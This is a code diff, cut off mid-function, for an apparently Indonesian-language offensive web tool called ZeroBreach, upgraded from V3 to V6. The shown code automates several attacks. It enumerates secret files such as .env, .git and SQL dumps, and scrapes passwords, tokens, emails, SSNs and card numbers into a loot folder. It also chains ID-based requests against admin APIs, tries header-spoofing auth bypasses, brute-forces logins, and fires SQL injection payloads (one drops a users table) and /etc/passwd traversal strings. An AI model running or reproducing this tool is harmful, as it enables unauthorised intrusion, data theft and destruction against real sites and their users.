@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 """
-ZeroBreach V3 — real recon + exploit tool.
-Input: domain / endpoint. Output: loot + report. No gimmick.
+ZeroBreach V6 — full arsenal.
+Auto-chain, auto-dump, sensitive detect, SQLi, brute, JS mining, subdomain enum.
 """
 
+import base64
+import hashlib
 import json
 import os
 import random
@@ -13,7 +15,7 @@ import string
 import sys
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urljoin, quote
 
 import requests
 import urllib3
@@ -29,28 +31,57 @@ Y = Fore.YELLOW
 C = Fore.CYAN
 W = Fore.WHITE
 M = Fore.MAGENTA
+B = Fore.BLUE
 RESET = Style.RESET_ALL
 BOLD = Style.BRIGHT
 
 
+BANNER = f"""{M}{BOLD}
+  ______  ______  ______  ______  ______  ______  ______  ______
+ |  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  |
+ | |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | |
+ | |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| |
+ |______||______||______||______||______||______||______||______|
+{RESET}{C}
+              >> ZEROBREACH V6 <<
+         full arsenal · auto chain · auto dump
+{RESET}"""
+
+
 MENU = f"""
 {C}{BOLD}╔══════════════════════════════════════════════════════════╗
-║                    ZEROBREACH V3                         ║
-║              real recon · exploit · dump                 ║
+║                    ZEROBREACH V6                         ║
+║              full arsenal — no gimmick                   ║
 ╚══════════════════════════════════════════════════════════╝{RESET}
 
-{Y}Pilih mode:{RESET}
-  {G}[1]{RESET} Full Auto      — semua stage (recon → dump)
-  {G}[2]{RESET} Recon Only     — fingerprint + endpoint enum
-  {G}[3]{RESET} Leak Check     — file sensitif (.env, .git, sql)
-  {G}[4]{RESET} Bypass Test    — header bypass
-  {G}[5]{RESET} Brute Force    — login brute pake wordlist
-  {G}[6]{RESET} Firebase Check — cek misconfig Firebase
-  {G}[7]{RESET} JS Mining      — cari credential di JS
-  {G}[8]{RESET} Port Scan      — cek port DB terbuka
-  {G}[9]{RESET} Endpoint Scan  — fokus 1 endpoint sedalam mungkin
-  {G}[0]{RESET} Keluar
+{Y}[ TARGET MODE ]{RESET}
+  {G}[1]{RESET}  Auto Chain          — hit endpoint, chain 30+ turunan
+  {G}[2]{RESET}  Full Attack         — semua modul auto
+  {G}[3]{RESET}  Deep Recon          — fingerprint + enum 50+ path
+  {G}[4]{RESET}  Leak Check          — file sensitif (.env, .git, sql)
+  {G}[5]{RESET}  Bypass Attack       — 9 header × 10 endpoint admin
+  {G}[6]{RESET}  Brute Force         — login brute (users × wordlist)
+  {G}[7]{RESET}  JS Mining           — credential + endpoint di JS
+  {G}[8]{RESET}  SQLi Probe          — 9 payload + time-based
+  {G}[9]{RESET}  Path Traversal      — 5 payload /etc/passwd
+  {G}[10]{RESET} Subdomain Enum      — cari subdomain via DNS
+  {G}[11]{RESET} Port Scan           — 12 port umum
+  {G}[12]{RESET} Directory Bruteforce— cari path tersembunyi
+  {G}[13]{RESET} CORS Scan           — cek misconfig CORS
+  {G}[14]{RESET} Header Analysis     — cek security header
+  {G}[15]{RESET} GraphQL Probe       — cek introspection
+  {G}[0]{RESET}  Keluar
 """
+
+
+SENSITIVE_KEYS = [
+    "email", "username", "password", "passwd", "hash",
+    "token", "api_key", "apikey", "secret", "private_key",
+    "access_token", "session", "cookie", "jwt", "bearer",
+    "phone", "address", "credit_card", "ssn", "nik", "ktp",
+    "role", "admin", "root", "superuser", "2fa", "otp",
+    "signature", "csrf", "secret_key", "aws_access",
+]
 
 
 def clear():
@@ -63,61 +94,52 @@ def pause():
 
 def log(kind, msg):
     tag = {
-        "info": f"{C}[*]{RESET}",
-        "ok":   f"{G}[+]{RESET}",
-        "warn": f"{Y}[!]{RESET}",
-        "err":  f"{R}[-]{RESET}",
-        "crit": f"{M}[X]{RESET}",
-        "dump": f"{G}{BOLD}[DUMP]{RESET}",
-        "hit":  f"{G}{BOLD}[HIT]{RESET}",
+        "info":   f"{C}[*]{RESET}",
+        "ok":     f"{G}[+]{RESET}",
+        "warn":   f"{Y}[!]{RESET}",
+        "err":    f"{R}[-]{RESET}",
+        "crit":   f"{M}[X]{RESET}",
+        "dump":   f"{G}{BOLD}[DUMP]{RESET}",
+        "chain":  f"{C}{BOLD}[CHAIN]{RESET}",
+        "sensi":  f"{M}{BOLD}[SENSITIVE]{RESET}",
+        "sqli":   f"{R}{BOLD}[SQLI]{RESET}",
+        "bypass": f"{M}{BOLD}[BYPASS]{RESET}",
+        "hit":    f"{G}{BOLD}[HIT]{RESET}",
     }[kind]
     print(f"{tag} {msg}")
 
 
 def safe_name(s):
-    return re.sub(r"[^a-zA-Z0-9._-]", "_", s)[:100]
+    return re.sub(r"[^a-zA-Z0-9._-]", "_", s)[:120]
+
+
+def rnd_str(n=8):
+    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
 
 def looks_like_data(text):
-    """Cek apakah response beneran data (bukan HTML SPA)."""
     t = text.strip()
     tl = t.lower()
     if not t or len(t) < 20:
         return False
-
-    # JSON object / array
     if t.startswith(("{", "[")):
-        # cek valid JSON
         try:
             json.loads(t)
             return True
         except Exception:
             return False
-
-    # .env / config style (KEY=value)
     if re.search(r"^[A-Z_]{3,}\s*=\s*\S", text, re.M):
         return True
-
-    # log file (timestamp)
     if re.search(r"\[\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}", text):
         return True
-
-    # db credentials
     if re.search(r"(DB_PASSWORD|DB_USER|APP_KEY|SECRET_KEY|API_KEY)\s*=", text):
         return True
-
-    # SQL dump
     if re.search(r"(INSERT INTO|CREATE TABLE|DROP TABLE)", text, re.I):
         return True
-
-    # git config
     if "[core]" in text and "repositoryformatversion" in text:
         return True
-
-    # HTML → bukan data
     if "<!doctype html" in tl or "<html" in tl:
         return False
-
     return False
 
 
@@ -136,25 +158,86 @@ def get_kind(text):
     return "txt"
 
 
+def find_sensitive(body):
+    found = []
+    bl = body.lower()
+    for k in SENSITIVE_KEYS:
+        if k in bl:
+            m = re.search(rf'"{re.escape(k)}"\s*:\s*"([^"]{{1,300}})"', body, re.I)
+            if m:
+                found.append((k, m.group(1)))
+                continue
+            m2 = re.search(rf'{re.escape(k)}\s*[:=]\s*(\S{{1,300}})', body, re.I)
+            if m2:
+                found.append((k, m2.group(1)[:300]))
+    return found
+
+
+def extract_ids(body):
+    ids, emails, usernames = set(), set(), set()
+    for m in re.finditer(r'"(?:id|user_id|server_id|account_id|node_id)"\s*:\s*(\d+)', body):
+        ids.add(m.group(1))
+    for m in re.finditer(r'"id"\s*:\s*"([a-f0-9-]{36})"', body):
+        ids.add(m.group(1))
+    for m in re.finditer(r'"email"\s*:\s*"([^"]+@[^"]+)"', body):
+        emails.add(m.group(1))
+    for m in re.finditer(r'"username"\s*:\s*"([^"]+)"', body):
+        usernames.add(m.group(1))
+    return list(ids)[:30], list(emails)[:30], list(usernames)[:30]
+
+
+CHAIN_ENDPOINTS = [
+    "/api/users/{id}", "/api/user/{id}",
+    "/api/application/users/{id}",
+    "/api/application/users/{id}/servers",
+    "/api/users/{id}/servers", "/api/users/{id}/permissions",
+    "/api/client/servers", "/api/client/account",
+    "/api/client/permissions", "/api/servers/{id}",
+    "/api/application/servers/{id}",
+    "/api/application/nodes/{id}",
+    "/api/config", "/api/settings",
+    "/api/keys", "/api/tokens", "/api/api-keys",
+    "/api/logs", "/api/activity", "/api/audit",
+    "/api/admin", "/api/admin/users",
+    "/api/v1/users", "/api/v2/users",
+    "/api/v1/config", "/api/v1/admin",
+    "/api/v1/keys", "/api/v1/logs",
+    "/api/v1/me", "/api/v1/profile",
+]
+
+
 PATHS = [
+    "/api", "/api/v1", "/api/v2", "/api/v3",
     "/api/users", "/api/admin", "/api/config", "/api/settings",
     "/api/keys", "/api/token", "/api/me", "/api/profile",
     "/api/users/count", "/api/servers", "/api/nodes",
     "/api/application/users", "/api/application/servers",
     "/api/application/nodes", "/api/application/locations",
-    "/api/client/account", "/api/logs", "/api/db",
-    "/api/database", "/api/backup", "/api/export",
-    "/api/v1/users", "/api/v2/users",
-    "/.env", "/.env.local", "/.env.backup",
-    "/config.json", "/config.js", "/config.php",
-    "/secrets.json", "/credentials.json",
-    "/.git/config", "/.git/HEAD",
-    "/storage/logs/laravel.log", "/error.log",
-    "/phpinfo.php", "/info.php",
-    "/db.sql", "/dump.sql", "/backup.sql",
-    "/admin", "/admin/login", "/dashboard",
-    "/swagger.json", "/openapi.json",
+    "/api/application/nests", "/api/client/account",
+    "/api/logs", "/api/db", "/api/database", "/api/backup",
+    "/api/export", "/api/import", "/api/search",
+    "/.env", "/.env.local", "/.env.backup", "/.env.production",
+    "/config.json", "/config.js", "/config.php", "/config.yaml",
+    "/secrets.json", "/credentials.json", "/firebase.json",
+    "/google-services.json", "/serviceAccount.json",
+    "/.git/config", "/.git/HEAD", "/.gitignore",
+    "/storage/logs/laravel.log", "/error.log", "/debug.log",
+    "/phpinfo.php", "/info.php", "/test.php",
+    "/db.sql", "/dump.sql", "/backup.sql", "/database.sql",
+    "/backup.zip", "/backup.tar.gz",
+    "/admin", "/admin/login", "/dashboard", "/phpmyadmin",
+    "/pma", "/administrator", "/wp-admin",
+    "/swagger.json", "/openapi.json", "/api-docs",
     "/graphql", "/graphiql",
+    "/robots.txt", "/sitemap.xml", "/.htaccess", "/web.config",
+]
+
+
+ADMIN_ENDPOINTS = [
+    "/api/application/users", "/api/application/servers",
+    "/api/application/nodes", "/api/application/nests",
+    "/api/admin/users", "/api/admin", "/api/v1/admin",
+    "/api/users", "/api/config", "/api/keys",
 ]
 
 
@@ -168,17 +251,49 @@ BYPASS_HEADERS = [
     {"X-Original-URL": "/"},
     {"X-Rewrite-URL": "/"},
     {"X-Custom-IP-Authorization": "127.0.0.1"},
+    {"X-Forwarded-For": "localhost"},
+    {"X-Host": "localhost"},
+    {"X-ProxyUser-Ip": "127.0.0.1"},
 ]
 
 
 LOGIN_PATHS = [
     "/api/login", "/api/auth/login", "/auth/login",
     "/login", "/admin/login", "/api/v1/login",
+    "/api/v1/auth/login", "/users/login", "/api/signin",
+]
+
+
+SQLI_PAYLOADS = [
+    "'", "\"", "' OR '1'='1", "' OR 1=1--",
+    "1' AND SLEEP(3)--", "1 UNION SELECT NULL--",
+    "%27", "1;DROP TABLE users--",
+    "' OR 'x'='x", "admin'--", "') OR ('1'='1",
+]
+
+
+TRAVERSAL = [
+    "../../etc/passwd",
+    "..%2f..%2fetc%2fpasswd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "....//....//etc/passwd",
+    "..\\..\\etc\\passwd",
+    "....\\....\\etc\\passwd",
+]
+
+
+DIR_WORDLIST = [
+    "admin", "login", "dashboard", "api", "test", "dev",
+    "backup", "config", "db", "sql", "old", "new",
+    "private", "secret", "internal", "staging", "prod",
+    "v1", "v2", "v3", "docs", "swagger", "graphql",
+    "uploads", "files", "assets", "static", "tmp",
+    "user", "users", "account", "profile", "settings",
 ]
 
 
 class ZeroBreach:
-    def __init__(self, target, timeout=8, threads=20, outdir="loot",
+    def __init__(self, target, timeout=8, threads=10, outdir="loot",
                  users_file="users.txt", wordlist_file="wordlist.txt"):
         self.target = target.rstrip("/")
         if not self.target.startswith(("http://", "https://")):
@@ -195,6 +310,8 @@ class ZeroBreach:
 
         self.hits = []
         self.loot = []
+        self.sensitive = []
+        self.visited = set()
         self.users = self._load(users_file)
         self.wordlist = self._load(wordlist_file)
         self.found_creds = None
@@ -207,13 +324,17 @@ class ZeroBreach:
             return []
 
     def _req(self, method, path, headers=None, data=None, json_data=None,
-             allow_redirects=True):
+             allow_redirects=True, timeout=None):
         url = path if path.startswith("http") else self.target + path
+        key = f"{method}:{url}"
+        if key in self.visited:
+            return None
+        self.visited.add(key)
         try:
             return self.session.request(
                 method=method, url=url, headers=headers,
                 data=data, json=json_data,
-                timeout=self.timeout, verify=False,
+                timeout=timeout or self.timeout, verify=False,
                 allow_redirects=allow_redirects,
             )
         except Exception:
@@ -237,8 +358,11 @@ class ZeroBreach:
         kind = get_kind(body)
         fname = f"{safe_name(name)}.{kind}"
         fpath = os.path.join(self.outdir, fname)
-        with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
-            f.write(body)
+        try:
+            with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
+                f.write(body)
+        except Exception:
+            return None
         return fpath
 
     def _auto_dump(self, label, r):
@@ -246,200 +370,124 @@ class ZeroBreach:
         if not looks_like_data(body):
             return False
         saved = self._save(label, body)
+        if not saved:
+            return False
         kind = get_kind(body)
         size = len(body)
         log("dump", f"{label} [{kind}] {size}B -> {saved}")
         self.loot.append((label, kind, size, saved))
-        self._record("crit", f"Dump: {label}", f"{kind} | {size}B | {saved}")
+
+        sens = find_sensitive(body)
+        if sens:
+            log("sensi", f"DATA PENTING di {label}:")
+            for k, v in sens[:15]:
+                print(f"        {M}{k}{RESET} = {W}{v[:120]}{RESET}")
+                self.sensitive.append((label, k, v))
+            self._record("crit", f"Data sensitif: {label}",
+                         f"{len(sens)} field sensitif")
         return True
 
     # ============================================================
-    # STAGE 1
+    # AUTO CHAIN
     # ============================================================
-    def stage_fingerprint(self):
-        print(f"\n{C}=== STAGE 1: FINGERPRINT ==={RESET}")
-        r = self.get("/")
+    def auto_chain(self):
+        print(f"\n{C}=== AUTO CHAIN ==={RESET}")
+        print(f"{C}Target: {W}{self.target}{RESET}\n")
+
+        r = self.get(self.target, allow_redirects=False)
         if not r:
-            log("err", "Target nggak respon.")
-            return False
-        log("ok", f"Target hidup: HTTP {r.status_code}")
-        log("info", f"Server: {r.headers.get('Server', '?')}")
-        log("info", f"X-Powered-By: {r.headers.get('X-Powered-By', '?')}")
+            log("err", "Endpoint nggak respon.")
+            return
 
-        body = r.text.lower()
-        tech = []
-        for kw, name in [
-            ("wp-content", "WordPress"), ("laravel", "Laravel"),
-            ("_next", "Next.js"), ("react", "React"),
-            ("vue", "Vue"), ("pterodactyl", "Pterodactyl"),
-            ("firebase", "Firebase"), ("cloudflare", "Cloudflare"),
-        ]:
-            if kw in body:
-                tech.append(name)
-        if tech:
-            log("ok", f"Tech: {', '.join(sorted(set(tech)))}")
-        return True
+        log("info", f"Status: HTTP {r.status_code} | {len(r.text)}B")
+        self._auto_dump("main", r)
 
-    # ============================================================
-    # STAGE 2 — ENDPOINT ENUM (anti false positive)
-    # ============================================================
-    def stage_endpoints(self):
-        print(f"\n{C}=== STAGE 2: ENDPOINT ENUM ({len(PATHS)} path) ==={RESET}")
+        ids, emails, usernames = extract_ids(r.text)
+        if ids or emails or usernames:
+            log("ok", f"Extracted: {len(ids)} ID, {len(emails)} email, "
+                      f"{len(usernames)} username")
 
-        # baseline: ambil body dari random path yang pasti 404
-        baseline_r = self.get(f"/{random_string(16)}", allow_redirects=False)
-        baseline_body = baseline_r.text if baseline_r else ""
-        baseline_len = len(baseline_body) if baseline_body else 0
+        print(f"\n{C}=== CHAINING ==={RESET}")
+        base = self.target.split("/api/")[0]
+        if "/api/" in self.target:
+            base = self.target.split("/api/")[0] + "/api"
 
-        if baseline_len > 100:
-            log("info", f"Baseline SPA terdeteksi ({baseline_len}B) — semua 200 sama bakal di-skip")
+        chain_urls = set()
+        for i in ids[:15]:
+            for ep in CHAIN_ENDPOINTS:
+                if "{id}" in ep:
+                    chain_urls.add(base + ep.replace("{id}", str(i)))
+        for ep in CHAIN_ENDPOINTS:
+            if "{id}" not in ep:
+                chain_urls.add(base + ep)
+        for e in emails[:10]:
+            chain_urls.add(f"{base}/users?email={e}")
+            chain_urls.add(f"{base}/user?email={e}")
 
-        def _check(p):
-            return p, self.get(p, allow_redirects=False)
+        log("info", f"Chain: {len(chain_urls)} URL")
+
+        def _check(url):
+            return url, self.get(url, allow_redirects=False)
 
         with ThreadPoolExecutor(max_workers=self.threads) as ex:
-            futs = [ex.submit(_check, p) for p in PATHS]
+            futs = [ex.submit(_check, u) for u in chain_urls]
             for f in as_completed(futs):
                 res = f.result()
                 if not res:
                     continue
-                p, r = res
-                if not r:
+                url, rr = res
+                if not rr:
                     continue
-                code = r.status_code
+                if rr.status_code == 200:
+                    label = "chain_" + safe_name(url.replace(base, ""))
+                    if self._auto_dump(label, rr):
+                        log("chain", f"OK: {url}")
+                    else:
+                        new_ids, new_emails, _ = extract_ids(rr.text)
+                        if new_ids or new_emails:
+                            log("chain", f"IDs: {url} -> "
+                                         f"{len(new_ids)} ID, {len(new_emails)} email")
 
-                if code == 200:
-                    body = r.text
-                    # anti false positive: kalau body = baseline, skip
-                    if baseline_len > 100 and abs(len(body) - baseline_len) < 50:
-                        if body[:100] == baseline_body[:100]:
-                            continue
-
-                    if not self._auto_dump(p, r):
-                        if len(body) > 300:
-                            self._record("med", f"Endpoint aktif: {p}",
-                                         f"HTTP 200 | {len(body)}B")
-                elif code == 401:
-                    self._record("med", f"Butuh auth: {p}", "HTTP 401")
-                elif code == 500:
-                    self._record("high", f"Error 500: {p}", "potensi info leak")
-                    if looks_like_data(r.text):
-                        self._auto_dump(f"err{p}", r)
-
-    # ============================================================
-    # STAGE 3
-    # ============================================================
-    def stage_leaks(self):
-        print(f"\n{C}=== STAGE 3: LEAK CHECK ==={RESET}")
-        leaks = [
-            "/.env", "/.env.local", "/.env.backup",
-            "/config.json", "/config.js", "/config.php",
-            "/secrets.json", "/credentials.json",
-            "/.git/config", "/.git/HEAD",
-            "/storage/logs/laravel.log",
-            "/db.sql", "/dump.sql", "/backup.sql",
-            "/backup.zip", "/phpinfo.php",
-        ]
-        for p in leaks:
-            r = self.get(p, allow_redirects=False)
-            if not r:
-                continue
-            if r.status_code == 200:
-                if looks_like_data(r.text):
-                    self._auto_dump(p, r)
-                else:
-                    log("info", f"{p} -> 200 tapi bukan data (SPA)")
-
-    # ============================================================
-    # STAGE 4
-    # ============================================================
-    def stage_bypass(self):
-        print(f"\n{C}=== STAGE 4: HEADER BYPASS ==={RESET}")
-        targets = ["/api/users", "/api/admin", "/api/config",
-                   "/api/application/users", "/api/servers"]
-        for t in targets:
-            base = self.get(t, allow_redirects=False)
-            if base and base.status_code == 200:
-                continue
+        print(f"\n{C}=== BYPASS ATTEMPT ==={RESET}")
+        for au in ADMIN_ENDPOINTS[:6]:
+            url = base + au.replace("/api", "") if au.startswith("/api") else base + au
             for h in BYPASS_HEADERS:
-                r = self.get(t, headers=h, allow_redirects=False)
-                if r and r.status_code == 200 and looks_like_data(r.text):
-                    log("crit", f"Bypass works: {t} via {list(h.keys())[0]}")
-                    self._record("crit", f"Header bypass: {t}",
-                                 f"{list(h.keys())[0]}={list(h.values())[0]}")
-                    self._auto_dump(f"bypass{t}", r)
+                rr = self._req("GET", url, headers=h, allow_redirects=False)
+                if rr and rr.status_code == 200 and looks_like_data(rr.text):
+                    log("bypass", f"{url} via {list(h.keys())[0]}")
+                    self._auto_dump(f"bypass_{safe_name(au)}", rr)
                     break
 
-    # ============================================================
-    # STAGE 5
-    # ============================================================
-    def stage_js(self):
-        print(f"\n{C}=== STAGE 5: JS MINING ==={RESET}")
-        r = self.get("/")
-        if not r:
-            return
-        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
-        js_urls = [urljoin(self.target, u) for u in js_urls][:15]
+        print(f"\n{C}=== LOGIN PROBE ==={RESET}")
+        base_no_api = self.target.split("/api/")[0]
+        for lp in LOGIN_PATHS:
+            url = base_no_api + lp
+            rr = self.post(url, json_data={}, allow_redirects=False)
+            if rr and rr.status_code not in (404,):
+                log("info", f"{url} -> HTTP {rr.status_code}")
 
-        if not js_urls:
-            log("info", "Nggak ada JS.")
-            return
-
-        cred_re = re.compile(
-            r'(api[_-]?key|apikey|secret|token|bearer|auth|password)'
-            r'["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
-            re.I,
-        )
-        ep_re = re.compile(r'["\'](/api/[a-zA-Z0-9/_-]{2,})["\']')
-
-        for js in js_urls:
-            jr = self.get(js)
-            if not jr or jr.status_code != 200:
-                continue
-            for m in cred_re.finditer(jr.text):
-                k, v = m.group(1), m.group(2)
-                if v.lower() in ("undefined", "null", "none", ""):
+        if self.users and self.wordlist:
+            print(f"\n{C}=== BRUTE ATTEMPT ==={RESET}")
+            for lp in LOGIN_PATHS:
+                url = base_no_api + lp
+                rr = self.post(url, json_data={})
+                if not rr or rr.status_code == 404:
                     continue
-                log("crit", f"Cred di JS: {k}={v[:60]}")
-                self._record("crit", "Credential di JS", f"{k}={v[:60]}")
-                self._save(f"cred_{k}", f"{k}={v}")
+                log("info", f"Brute: {url}")
+                with ThreadPoolExecutor(max_workers=3) as ex:
+                    futs = {}
+                    for u in self.users:
+                        for p in self.wordlist:
+                            futs[ex.submit(self._try_login, url, u, p)] = (u, p)
+                    for f in as_completed(futs):
+                        res = f.result()
+                        if res:
+                            log("hit", f"LOGIN: {url} | {res[0]}:{res[1]}")
+                            self.found_creds = (url, res[0], res[1])
+                            for ff in futs:
+                                ff.cancel()
+                            return
 
-            eps = list(set(ep_re.findall(jr.text)))[:20]
-            for ep in eps:
-                self._record("info", "Endpoint di JS", ep)
-
-    # ============================================================
-    # STAGE 6
-    # ============================================================
-    def stage_firebase(self):
-        print(f"\n{C}=== STAGE 6: FIREBASE CHECK ==={RESET}")
-        r = self.get("/")
-        if not r:
-            return
-        project = None
-        m = re.search(r'"projectId"\s*:\s*"([^"]+)"', r.text)
-        if m:
-            project = m.group(1)
-        if not project:
-            log("info", "Nggak ketemu Firebase config.")
-            return
-        log("info", f"Firebase project: {project}")
-        for u in [
-            f"https://{project}.firebaseio.com/.json",
-            f"https://{project}-default-rtdb.firebaseio.com/.json",
-        ]:
-            try:
-                rr = requests.get(u, timeout=self.timeout, verify=False)
-                if rr.status_code == 200 and looks_like_data(rr.text):
-                    log("crit", f"FIREBASE DUMP: {u}")
-                    self._save(f"firebase_{project}", rr.text)
-                    self._record("crit", "Firebase misconfig", f"{u}")
-            except Exception:
-                pass
-
-    # ============================================================
-    # STAGE 7 — BRUTE
-    # ============================================================
     def _try_login(self, path, user, pw):
         for key_u, key_p in [("email", "password"), ("username", "password"),
                              ("user", "pass")]:
@@ -458,203 +506,368 @@ class ZeroBreach:
                 pass
         return None
 
-    def stage_creds(self):
-        print(f"\n{C}=== STAGE 7: BRUTE FORCE ==={RESET}")
+    # ============================================================
+    # DEEP RECON
+    # ============================================================
+    def deep_recon(self):
+        print(f"\n{C}=== DEEP RECON ==={RESET}")
+        r = self.get("/")
+        if r:
+            log("ok", f"Target hidup: HTTP {r.status_code}")
+            log("info", f"Server: {r.headers.get('Server', '?')}")
+            log("info", f"X-Powered-By: {r.headers.get('X-Powered-By', '?')}")
+            body = r.text.lower()
+            tech = []
+            for kw, name in [("laravel", "Laravel"), ("_next", "Next.js"),
+                             ("react", "React"), ("vue", "Vue"),
+                             ("pterodactyl", "Pterodactyl"),
+                             ("wordpress", "WordPress"), ("django", "Django"),
+                             ("cloudflare", "Cloudflare")]:
+                if kw in body:
+                    tech.append(name)
+            if tech:
+                log("ok", f"Tech: {', '.join(set(tech))}")
+
+        baseline_r = self.get(f"/{rnd_str(16)}", allow_redirects=False)
+        baseline_len = len(baseline_r.text) if baseline_r else 0
+        if baseline_len > 100:
+            log("info", f"Baseline SPA: {baseline_len}B (false-positive filter ON)")
+
+        log("info", f"Enum {len(PATHS)} path...")
+
+        def _check(p):
+            return p, self.get(p, allow_redirects=False)
+
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futs = [ex.submit(_check, p) for p in PATHS]
+            for f in as_completed(futs):
+                res = f.result()
+                if not res:
+                    continue
+                p, rr = res
+                if not rr:
+                    continue
+                if rr.status_code == 200:
+                    if baseline_len and abs(len(rr.text) - baseline_len) < 50:
+                        if rr.text[:100] == baseline_r.text[:100]:
+                            continue
+                    self._auto_dump(p, rr)
+                elif rr.status_code == 401:
+                    self._record("med", f"Butuh auth: {p}", "HTTP 401")
+                elif rr.status_code == 500:
+                    self._record("high", f"Error 500: {p}", "potensi leak")
+                    if looks_like_data(rr.text):
+                        self._auto_dump(f"err{p}", rr)
+
+    # ============================================================
+    # LEAK CHECK
+    # ============================================================
+    def leak_check(self):
+        print(f"\n{C}=== LEAK CHECK ==={RESET}")
+        leaks = [
+            "/.env", "/.env.local", "/.env.backup", "/.env.production",
+            "/config.json", "/config.js", "/config.php", "/config.yaml",
+            "/secrets.json", "/credentials.json",
+            "/.git/config", "/.git/HEAD",
+            "/storage/logs/laravel.log", "/error.log",
+            "/db.sql", "/dump.sql", "/backup.sql",
+            "/backup.zip", "/backup.tar.gz",
+            "/phpinfo.php", "/info.php",
+        ]
+        for p in leaks:
+            r = self.get(p, allow_redirects=False)
+            if r and r.status_code == 200 and looks_like_data(r.text):
+                self._auto_dump(p, r)
+
+    # ============================================================
+    # BYPASS ATTACK
+    # ============================================================
+    def bypass_attack(self):
+        print(f"\n{C}=== BYPASS ATTACK ==={RESET}")
+        for ep in ADMIN_ENDPOINTS:
+            base_r = self.get(ep, allow_redirects=False)
+            # kalau baseline udah 200, skip (false positive)
+            if base_r and base_r.status_code == 200 and looks_like_data(base_r.text):
+                continue
+            for h in BYPASS_HEADERS:
+                r = self.get(ep, headers=h, allow_redirects=False)
+                if r and r.status_code == 200 and looks_like_data(r.text):
+                    log("bypass", f"{ep} via {list(h.keys())[0]}")
+                    self._auto_dump(f"bypass_{safe_name(ep)}", r)
+                    break
+
+    # ============================================================
+    # BRUTE FORCE
+    # ============================================================
+    def brute_only(self):
+        print(f"\n{C}=== BRUTE FORCE ==={RESET}")
         if not self.users or not self.wordlist:
             log("warn", "users.txt / wordlist.txt kosong.")
             return
-
         log("info", f"Users: {len(self.users)} | Passwords: {len(self.wordlist)}")
-
+        base = self.target.split("/api/")[0]
         for lp in LOGIN_PATHS:
-            r = self.post(lp, json_data={})
-            if not r or r.status_code == 404:
+            url = base + lp
+            rr = self.post(url, json_data={})
+            if not rr or rr.status_code == 404:
                 continue
-            log("info", f"Coba login di: {lp}")
-
-            found = None
-            with ThreadPoolExecutor(max_workers=5) as ex:
+            log("info", f"Coba: {url}")
+            with ThreadPoolExecutor(max_workers=3) as ex:
                 futs = {}
                 for u in self.users:
                     for p in self.wordlist:
-                        futs[ex.submit(self._try_login, lp, u, p)] = (u, p)
-
+                        futs[ex.submit(self._try_login, url, u, p)] = (u, p)
                 for f in as_completed(futs):
                     res = f.result()
                     if res:
-                        found = res
-                        log("hit", f"LOGIN BERHASIL: {lp} | {res[0]}:{res[1]}")
-                        self.found_creds = (lp, res[0], res[1])
-                        self._record("crit", f"Login berhasil: {lp}",
-                                     f"{res[0]}:{res[1]}")
+                        log("hit", f"LOGIN: {url} | {res[0]}:{res[1]}")
+                        self.found_creds = (url, res[0], res[1])
                         for ff in futs:
                             ff.cancel()
-                        break
-            if found:
-                break
+                        return
 
     # ============================================================
-    # STAGE 8 — PORT SCAN
+    # JS MINING
     # ============================================================
-    def stage_ports(self):
-        print(f"\n{C}=== STAGE 8: PORT SCAN ==={RESET}")
+    def js_mining(self):
+        print(f"\n{C}=== JS MINING ==={RESET}")
+        r = self.get("/")
+        if not r:
+            return
+        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
+        js_urls = [urljoin(self.target, u) for u in js_urls][:20]
+        log("info", f"JS files: {len(js_urls)}")
+
+        cred_re = re.compile(
+            r'(api[_-]?key|apikey|secret|token|bearer|auth|password|private[_-]?key)'
+            r'["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
+            re.I,
+        )
+        ep_re = re.compile(r'["\'](/api/[a-zA-Z0-9/_-]{2,})["\']')
+
+        for js in js_urls:
+            jr = self.get(js)
+            if not jr or jr.status_code != 200:
+                continue
+            for m in cred_re.finditer(jr.text):
+                k, v = m.group(1), m.group(2)
+                if v.lower() in ("undefined", "null", "none", ""):
+                    continue
+                log("crit", f"Cred: {k}={v[:60]}")
+                self._record("crit", "Credential di JS", f"{k}={v[:60]}")
+                self.sensitive.append((js, k, v))
+                self._save(f"cred_{k}", f"{k}={v}")
+
+            eps = list(set(ep_re.findall(jr.text)))[:30]
+            log("info", f"Endpoint di JS: {len(eps)}")
+            for ep in eps:
+                self._record("info", "Endpoint di JS", ep)
+                er = self.get(ep)
+                if er and er.status_code == 200 and looks_like_data(er.text):
+                    self._auto_dump(f"js{safe_name(ep)}", er)
+
+    # ============================================================
+    # SQLi PROBE
+    # ============================================================
+    def sqli_probe(self):
+        print(f"\n{C}=== SQLi PROBE ==={RESET}")
+        base = self.target.split("?")[0].rstrip("/")
+        for pl in SQLI_PAYLOADS:
+            url = f"{base}?id={quote(pl)}"
+            start = time.time()
+            r = self._req("GET", url, allow_redirects=False, timeout=10)
+            elapsed = time.time() - start
+            if not r:
+                continue
+            if r.status_code == 500:
+                log("sqli", f"500 di {pl[:30]}")
+                self._record("high", f"SQLi suspect: {pl[:30]}", "HTTP 500")
+            if elapsed > 2.5:
+                log("sqli", f"Delay {elapsed:.1f}s di {pl[:30]}")
+                self._record("crit", f"Time-based SQLi: {pl[:30]}", f"delay {elapsed:.1f}s")
+            if re.search(r"(sql syntax|mysql_|ORA-|PostgreSQL|SQLite)", r.text, re.I):
+                log("sqli", f"SQL error di {pl[:30]}")
+                self._record("crit", f"SQL error: {pl[:30]}", "error leak")
+                self._auto_dump(f"sqli_{safe_name(pl)}", r)
+
+    # ============================================================
+    # PATH TRAVERSAL
+    # ============================================================
+    def path_traversal(self):
+        print(f"\n{C}=== PATH TRAVERSAL ==={RESET}")
+        base = self.target.split("?")[0].rstrip("/")
+        for tr in TRAVERSAL:
+            for param in ["file", "path", "page", "include", "doc", "template"]:
+                url = f"{base}?{param}={tr}"
